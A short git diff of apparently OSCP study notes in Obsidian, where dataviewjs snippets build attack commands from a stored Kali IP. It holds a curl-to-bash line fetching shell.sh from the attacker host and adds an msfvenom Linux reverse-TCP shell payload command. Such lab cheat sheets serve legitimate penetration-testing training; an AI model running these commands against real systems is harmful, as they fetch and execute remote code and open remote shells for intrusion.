@@ -253,6 +253,16 @@ const command = `curl+${KaliIP}:80/shell.sh|bash`;
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 
+## MSFVENOM
+---
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p linux/x86/shell_reverse_tcp LHOST=${KaliIP} LPORT=4444 -f elf > reverse.elf`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 ---
 # 🎯 Step 3 — Stabilize the Shell
 
